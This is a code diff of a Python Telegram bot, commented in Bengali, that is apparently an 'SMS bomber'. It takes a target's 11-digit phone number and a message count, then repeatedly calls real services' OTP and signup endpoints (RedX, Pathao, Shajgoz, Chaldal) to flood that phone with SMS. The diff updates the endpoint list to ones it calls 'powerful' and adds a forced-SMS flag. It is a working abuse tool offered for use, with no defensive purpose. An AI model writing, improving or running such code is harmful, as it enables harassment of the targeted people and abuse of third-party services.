@@ -13,9 +13,10 @@ bot = telebot.TeleBot(API_TOKEN)
 user_data = {}
 verified_users = set()
 
+# ২. Render সচল রাখার জন্য Flask
 app = Flask('')
 @app.route('/')
-def home(): return "Server is Running!"
+def home(): return "Power Bomber is Live!"
 
 def run():
     app.run(host='0.0.0.0', port=8080)
@@ -30,15 +31,16 @@ def check_join(chat_id):
         return status in ['member', 'administrator', 'creator']
     except: return False
 
-# ২. স্টার্ট কমান্ড ও ভেরিফিকেশন (একবারই আসবে)
+# ৩. কমান্ড হ্যান্ডলার
 @bot.message_handler(commands=['start'])
 def welcome(message):
     chat_id = message.chat.id
     if check_join(chat_id):
+        # ভেরিফিকেশন মেসেজ শুধু প্রথমবার আসবে
         if chat_id not in verified_users:
             bot.send_message(chat_id, "✅ **ভেরিফিকেশন সফল হয়েছে!**", parse_mode="Markdown")
             verified_users.add(chat_id)
-            time.sleep(1)
+            time.sleep(0.5)
         
         msg = bot.send_message(chat_id, "🚀 SMS পাঠাতে এখন নাম্বারটি দিন (১১ ডিজিট):")
         bot.register_next_step_handler(msg, get_number)
@@ -56,14 +58,14 @@ def verify_join(call):
     else:
         bot.answer_callback_query(call.id, "❌ আপনি এখনো জয়েন হননি!", show_alert=True)
 
-# ৩. কঠোর ১১ ডিজিট চেক
+# ৪. নাম্বার ইনপুট ও চেক
 def get_number(message):
     num = message.text
     if num == "/start":
         welcome(message)
         return
     
-    if not num.isdigit() or len(num) != 11:
+    if not num or not num.isdigit() or len(num) != 11:
         msg = bot.send_message(message.chat.id, "⚠️ ভুল নাম্বার! ১১ ডিজিটের সঠিক নাম্বার দিন:")
         bot.register_next_step_handler(msg, get_number)
         return
@@ -72,7 +74,7 @@ def get_number(message):
     msg = bot.send_message(message.chat.id, "🔢 কতটি SMS পাঠাতে চান? (১-১০০):")
     bot.register_next_step_handler(msg, send_bomber)
 
-# ৪. বোম্বিং প্রসেস (ধীরে ধীরে SMS যাবে)
+# ৫. বোম্বিং প্রসেস (নতুন কার্যকরী API সহ)
 def send_bomber(message):
     try:
         amount = int(message.text)
@@ -83,22 +85,27 @@ def send_bomber(message):
         
         for i in range(amount):
             try:
-                # একাধিক API সোর্স (যাতে ১০-২০টার বেশি SMS যায়)
-                requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num}", timeout=5)
+                # API 1: RedX (খুবই পাওয়ারফুল)
                 requests.post("https://api-dest.redx.com.bd/v1/user/signup", json={"phone": num}, timeout=5)
-                requests.post("https://api.pathao.com/v1/auth/otp/send", data={"phone": num}, timeout=5)
-                requests.post("https://chaldal.com/api/customer/LoginOTP", json={"PhoneNumber": num}, timeout=5)
-                requests.get(f"https://fundesh.com.bd/api/auth/send-otp?phone={num}", timeout=5)
                 
-                # আপনি যেমন চেয়েছেন - ধীরে ধীরে পাঠানোর জন্য ২ সেকেন্ড বিরতি
+                # API 2: Pathao 
+                requests.post("https://api.pathao.com/v1/auth/otp/send", json={"phone": num}, timeout=5)
+                
+                # API 3: Shajgoz
+                requests.post("https://fur-api.shajgoz.com/api/v1/auth/send-otp", json={"phone": num}, timeout=5)
+                
+                # API 4: Chaldal
+                requests.post("https://chaldal.com/api/customer/LoginOTP", json={"PhoneNumber": num, "forceSms": True}, timeout=5)
+
+                # প্রতি SMS এর পর বিরতি যাতে রিকোয়েস্ট মিস না হয়
                 time.sleep(2) 
             except:
                 continue
                 
-        # আপনার পছন্দের সেই পুরনো লেখা
-        bot.send_message(message.chat.id, "✅ কাজ শেষ!")
+        # আপনার চাওয়া সেই নির্দিষ্ট টেক্সট
+        bot.send_message(message.chat.id, "✅ মিশন কমপ্লিট! আবার পাঠাতে চাইলে /start লিখুন।")
     except:
-        bot.send_message(message.chat.id, "❌ শুধু সংখ্যা লিখুন।")
+        bot.send_message(message.chat.id, "❌ শুধু সংখ্যা দিন।")
 
 if __name__ == "__main__":
     keep_alive()
